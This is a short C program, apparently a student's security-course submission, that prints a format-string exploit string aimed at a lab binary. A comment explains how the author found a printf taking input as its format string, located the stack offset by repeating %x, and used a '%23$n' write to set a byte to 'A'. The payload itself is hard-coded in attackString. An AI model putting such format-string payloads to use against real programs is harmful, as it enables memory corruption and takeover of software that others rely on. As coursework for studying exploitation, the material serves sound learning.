#include <stdio.h>

/* Name: You Gao
 * ID: djx3rn 
 * I first dissambled and looked around to understand the functions that were being called
 * I realized that there were 2 prints and the vulnerable was the "free" print to input a fmt string into 
 * I ran xxd to find the locations of the string, but was not so useful
 * I just needed to look at the last print function to get the address of the char byte to overwrite
 * I got stuck on the part of figuring out the argument location of my buffer address in order to write to it.
 * I think I was supposed to calculate it specifically?
 * Instead I spammed %x until I saw my address and then just counted the amount of %x.
 * Then I made sure the amnt of char's printed to the stream was the ASCII val for 'A'.
 */
char attackString[] = "\x2a\xa0\x04\x08 %59x %23$n\nYou Gao\n";

int main() {
	int i;
	char *p = attackString;
	for (i=0; i <sizeof(attackString); i++){
		putchar(*p);
		p++;
	}
	return 1;
}
